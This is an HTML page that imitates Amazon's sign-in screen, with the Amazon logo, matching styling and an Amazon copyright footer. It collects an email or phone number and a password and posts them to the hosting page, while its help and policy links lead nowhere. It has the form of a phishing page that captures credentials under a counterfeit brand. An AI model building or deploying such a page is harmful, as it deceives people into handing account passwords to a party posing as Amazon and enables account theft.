<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
	<title>Amazon Sign-In</title>
	<style type="text/css">body { background: #e3e6e6; font-family: Arial, sans-serif; }
    .container { width: 350px; margin: 60px auto; padding: 35px 24px 22px 24px; background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.18); }
    .amazon-logo { display: block; margin: 0 auto 18px auto; width: 120px; }
    h1 { font-size: 28px; font-weight: normal; margin-bottom: 18px; }
    label { font-size: 15px; font-weight: bold; display: block; margin-bottom: 2px; }
    input[type="text"], input[type="password"] {
      width: 100%; height: 35px; border: 1px solid #a6a6a6;
      border-radius: 3px; margin-bottom: 18px; padding: 0 8px; font-size: 17px;
      background: #f7f7f7;
    }
    input[type="submit"] {
      width: 100%; background: #ffd814; color: #111; border: 1px solid #fcd200;
      border-radius: 3px; height: 35px; font-size: 18px; font-weight: bold;
      cursor: pointer;
    }
    input[type="submit"]:hover { background: #f7ca00; }
    .help-links {
      text-align: left; font-size: 14px; margin-top: 16px;
    }
    .help-links a { color: #0066c0; text-decoration: none; }
    .help-links a:hover { text-decoration: underline; }
    .conditions {
      font-size: 12px; color: #555; margin-top: 25px; text-align: center;
    }
    .footer {
      font-size: 11px; color: #666; text-align: center; margin-top: 30px;
    }
	</style>
</head>
<body>
<div class="container"><img alt="Amazon" class="amazon-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"/>
<h1>Sign-In</h1>

<form action="" method="post"><label for="username">Email or mobile phone number</label> <input id="username" name="username" required="" type="text"/> <label for="password">Password</label> <input id="password" name="password" required="" type="password"/> <input type="submit" value="Sign-In"/> </form>

<div class="help-links"><a href="#">Forgot Password?</a><br/>
<a href="#">Other issues with Sign-In</a></div>

<div class="conditions">By continuing, you agree to Amazon&#39;s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
</div>

<div class="footer">© 1996-2025, Amazon.com, Inc. or its affiliates</div>


</body></html>
